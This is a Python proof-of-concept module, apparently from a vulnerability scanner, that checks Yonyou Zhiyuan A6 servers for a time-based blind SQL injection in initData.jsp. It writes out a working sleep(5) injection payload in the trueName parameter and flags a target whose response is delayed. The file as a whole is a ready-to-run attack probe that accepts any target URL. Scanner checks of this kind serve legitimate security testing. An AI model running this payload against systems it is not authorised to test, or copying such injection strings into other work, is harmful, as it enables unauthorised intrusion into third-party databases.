# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0040'  # 平台漏洞编号，留空
    name = '用友致远A6 initData.jsp SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-17'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友致远A6 initData.jsp SQL注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0107543'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6f0582a6-7616-497a-8ed0-86da4be789dc'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            true_url = arg + 'yyoa/common/selectPersonNew/initData.jsp?trueName=1'
            start_time1 = time.time()
            code1, head1, body1, errcode1, fina_url1 = hh.http(true_url)
            true_time = time.time() - start_time1
            flase_url = arg + "yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%285%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29%3E64%20AND%20%27%25%27%3D%27"
            start_time2 = time.time()
            code2, head2, body2, errcode2, fina_url2 = hh.http(flase_url)
            flase_time = time.time() - start_time2
            if code1 == 200 and code2 == 200 and flase_time > true_time and flase_time > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
